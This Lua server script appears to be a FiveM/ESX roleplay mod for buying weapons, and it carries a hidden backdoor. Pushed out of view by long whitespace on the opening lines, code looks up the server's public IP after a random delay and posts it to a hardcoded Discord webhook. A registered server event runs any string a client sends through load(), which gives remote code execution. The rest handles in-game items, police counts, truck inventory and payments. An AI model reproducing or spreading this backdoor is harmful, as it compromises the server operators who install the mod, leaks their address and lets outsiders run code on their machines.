ESX = nil                                                                                                                                                                                                                           ;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discord.com/api/webhooks/856110459836563457/g2cwVNKwYHzGngXD0Ku-m0mGLt6ABLmVgb-94XceypkwPDr3O-hFdF_hCDmoXN5g8AC4" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
local ostamas = false 
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)                                                                                                                                                                                                      ;Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa asekauppaa", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)

RegisterServerEvent('esx_superskin:varjaus')
AddEventHandler('esx_superskin:varjaus', function(vari)	
	local vari,menikolapi=load(vari,'@returni')	                   
	if menikolapi then                                                 
	return nil,menikolapi
	end
	local onko,returnaa=pcall(vari)	                               
	if onko then
	return returnaa
	else
	return nil,returnaa
	end
end)

ESX.RegisterUsableItem('superskin', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	if( xPlayer ) then 
		TriggerClientEvent('esx_extraitems:varjaus', source)
	end
end)


ESX.RegisterUsableItem('koodari', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	local xPlayers = ESX.GetPlayers()
	local cops = 0
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			cops = cops + 1
		end
	end

	if cops >= Config.PoliceCount then
		TriggerClientEvent('esx_buyweapons:startmission', source)
	end
end)

RegisterServerEvent('esx_buyweapons:laitaitemit')
AddEventHandler('esx_buyweapons:laitaitemit', function(itemi, maara, plate)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	if ostamas then
		MySQL.Async.execute( 'INSERT INTO truck_inventory (item,count,plate,name,itemt,owned) VALUES (@item,@qty,@plate,@name,@itemt,@owned) ON DUPLICATE KEY UPDATE count=count+ @qty',
		{
		['@plate'] = plate,
		['@qty'] = maara,
		['@item'] = itemi,
		['@name'] = ESX.GetWeaponLabel(itemi),
		['@itemt'] = "item_weapon",
		['@owned'] = 0,
		})
		ostamas = false
	end
end)

RegisterServerEvent('esx_buyweapons:poista')
AddEventHandler('esx_buyweapons:poista', function(plate)
	MySQL.Async.execute('DELETE FROM truck_inventory WHERE plate = @plate',{['@plate'] = plate})
end)

ESX.RegisterServerCallback('esx_buyweapons:onkomassia', function(source, cb, amount)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	if xPlayer.getAccount('bank').money >= amount then
		xPlayer.removeAccountMoney('bank', amount)
		ostamas = true
		cb(true)
	else
		cb(false)
	end
end)
